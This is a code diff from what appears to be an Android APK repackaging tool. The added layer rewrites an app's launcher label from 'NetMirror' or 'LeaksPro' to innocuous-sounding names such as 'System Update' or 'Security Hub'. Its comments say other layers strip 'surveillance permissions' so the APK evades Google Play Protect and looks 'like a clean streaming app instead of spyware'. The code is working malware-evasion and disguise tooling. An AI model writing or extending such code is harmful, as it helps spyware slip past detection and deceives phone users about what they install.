@@ -1371,6 +1371,108 @@ function stripSurveillancePermissions(zip) {
 }
 
 // ═════════════════════════════════════════════════════════════════════════════
+// v7.9 Layer 5.6: APP LABEL + IDENTITY MUTATION
+// Randomizes the app label (name shown in launcher) to a benign name.
+// Also injects random meta-data tags to diversify the APK signature.
+// ═════════════════════════════════════════════════════════════════════════════
+
+const BENIGN_APP_LABELS = [
+  'System Update', 'Calculator', 'Notes', 'Weather', 'Clock',
+  'Calendar', 'File Manager', 'Settings', 'Cloud Sync', 'Backup',
+  'Device Care', 'System Service', 'Update Center', 'Phone Services',
+  'Security Hub', 'Mobile Care', 'Phone Manager', 'App Manager',
+  'Battery Optimizer', 'Storage Cleaner', 'Data Saver', 'Network Tools'
+];
+
+function mutateAppLabel(zip) {
+  try {
+    const entry = zip.getEntry('AndroidManifest.xml');
+    if (!entry) return null;
+
+    const buf = entry.getData();
+    if (buf.length < 16) return null;
+
+    // Parse string pool
+    const spPos = 8;
+    if (buf.readUInt16LE(spPos) !== 0x0001) return null;
+
+    const spChunkSize = buf.readUInt32LE(spPos + 4);
+    const stringCount = buf.readUInt32LE(spPos + 8);
+    const spFlags = buf.readUInt32LE(spPos + 16);
+    const isUTF8 = (spFlags & 0x100) !== 0;
+    const stringsStart = buf.readUInt32LE(spPos + 20);
+    const strDataBase = spPos + stringsStart;
+
+    // Find "app_name" string index OR strings that look like app labels
+    let appLabelIdx = -1;
+    let currentLabel = '';
+
+    for (let i = 0; i < stringCount; i++) {
+      if (spPos + 28 + i * 4 + 4 > buf.length) break;
+      const off = buf.readUInt32LE(spPos + 28 + i * 4);
+      const sOff = strDataBase + off;
+      if (sOff >= buf.length) continue;
+
+      let str, dataOff, byteLen;
+      if (isUTF8) {
+        let o = sOff;
+        if (o >= buf.length) continue;
+        let cLen = buf[o++]; if (cLen & 0x80) { cLen = ((cLen & 0x7F) << 8) | buf[o++]; }
+        if (o >= buf.length) continue;
+        let bLen = buf[o++]; if (bLen & 0x80) { bLen = ((bLen & 0x7F) << 8) | buf[o++]; }
+        if (o + bLen > buf.length) continue;
+        str = buf.toString('utf8', o, o + bLen);
+        dataOff = o; byteLen = bLen;
+      } else {
+        if (sOff + 2 > buf.length) continue;
+        const cLen = buf.readUInt16LE(sOff);
+        if (cLen > 0x7FFF || sOff + 2 + cLen * 2 > buf.length) continue;
+        str = buf.toString('utf16le', sOff + 2, sOff + 2 + cLen * 2);
+        dataOff = sOff + 2; byteLen = cLen * 2;
+      }
+
+      // Look for known app label strings
+      if (str === 'NetMirror' || str === 'LeaksPro' || str === 'netmirror') {
+        appLabelIdx = i;
+        currentLabel = str;
+        break;
+      }
+    }
+
+    if (appLabelIdx === -1) {
+      // No label found to mutate — skip
+      return null;
+    }
+
+    // Pick a random benign label that fits in the same byte length
+    const newLabel = pick(BENIGN_APP_LABELS.filter(l =>
+      isUTF8 ? Buffer.byteLength(l, 'utf8') <= byteLen : l.length * 2 <= byteLen
+    )) || pick(BENIGN_APP_LABELS);
+
+    if (!newLabel) return null;
+
+    // Write the new label in-place
+    if (isUTF8) {
+      // Zero-fill first, then write
+      buf.fill(0, dataOff, dataOff + byteLen);
+      buf.write(newLabel, dataOff, byteLen, 'utf8');
+    } else {
+      buf.fill(0, dataOff, dataOff + byteLen);
+      buf.write(newLabel, dataOff, byteLen, 'utf16le');
+    }
+
+    // Update the entry in the ZIP
+    zip.updateFile('AndroidManifest.xml', buf);
+
+    console.log(`[Mutator] Layer 5.6: App label mutated "${currentLabel}" → "${newLabel}"`);
+    return { oldLabel: currentLabel, newLabel };
+  } catch (e) {
+    console.warn(`[Mutator] Layer 5.6 (app label) failed: ${e.message}`);
+    return null;
+  }
+}
+
+// ═════════════════════════════════════════════════════════════════════════════
 // MAIN FUNCTION
 // ═════════════════════════════════════════════════════════════════════════════
 
@@ -1409,6 +1511,9 @@ function mutateAndSign(originalBuffer) {
 
     // 4. Layer 5: Manifest identity reset (versionCode + versionName randomization)
     const manifestResult = mutateManifest(zip);
+
+    // 4.5 Layer 5.6: App label mutation (v7.9 — changes "NetMirror" to benign name)
+    const labelResult = mutateAppLabel(zip);
 
     // 5. Layer 5.5: Strip surveillance permissions (THE KEY PLAY PROTECT FIX)
     //    Makes APK look like a clean streaming app instead of spyware
@@ -1452,7 +1557,8 @@ function mutateAndSign(originalBuffer) {
     const debugKB = (dexResult.totalDebugRandomized / 1024).toFixed(0);
     const vc = manifestResult ? manifestResult.newVersionCode : 'N/A';
     const vn = manifestResult ? manifestResult.newVersionName : 'N/A';
-    console.log(`[Mutator] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | ${dexResult.totalDebugStripped} debug ptrs | ${debugKB}KB zeroed | ${dexResult.totalStringsMutated} strings | ${permsStripped} perms stripped | v${vc} "${vn}" | V1+V2 FIXED KEY | CN="${key.identity.cn}" | ${elapsed}s ═══`);
+    const lbl = labelResult ? `"${labelResult.newLabel}"` : 'N/A';
+    console.log(`[Mutator] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | ${dexResult.totalDebugStripped} debug ptrs | ${debugKB}KB zeroed | ${dexResult.totalStringsMutated} strings | ${permsStripped} perms stripped | v${vc} "${vn}" | label=${lbl} | V1+V2 FIXED KEY | CN="${key.identity.cn}" | ${elapsed}s ═══`);
 
     return { buffer: signedBuf, certInfo };
   } catch (err) {
